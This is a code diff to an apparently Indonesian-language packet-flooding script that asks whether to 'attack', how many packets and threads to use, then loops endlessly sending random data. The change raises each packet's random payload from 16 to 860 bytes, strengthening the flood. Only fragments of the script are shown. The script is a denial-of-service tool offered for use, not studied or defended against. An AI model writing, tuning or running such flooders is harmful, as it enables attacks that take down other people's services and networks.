@@ -27,7 +27,7 @@ choice = str(input("Serang Ga Ni WOY?(y/n):"))
 times = int(input("Packetnya berapa | Packets:"))
 threads = int(input("Mau Berapa Lama | Threads:"))
 def run():
-        data = random._urandom(16)
+        data = random._urandom(860)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
@@ -39,7 +39,7 @@ def run():
                 except:
                         print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 def run2():
-        data = random._urandom(16)
+        data = random._urandom(860)
         i = random.choice(("[*]","[!]","[#]"))
         while True:
                 try:
